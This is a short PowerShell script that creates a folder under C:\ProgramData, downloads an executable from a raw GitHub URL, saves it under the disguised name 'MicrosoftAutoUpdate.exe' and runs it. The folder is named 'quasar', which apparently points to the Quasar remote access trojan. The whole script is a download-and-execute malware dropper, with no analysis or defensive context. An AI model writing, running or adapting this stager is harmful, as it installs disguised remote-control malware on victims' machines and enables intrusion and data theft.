cd C:\programdata\zdataxd
mkdir quasar
cd quasar
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/MicrosoftAutoUpdate.exe'
$destination = 'C:\ProgramData\zDATAxD\quasar\MicrosoftAutoUpdate.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
start C:\programdata\zdataxd\quasar\MicrosoftAutoUpdate.exe
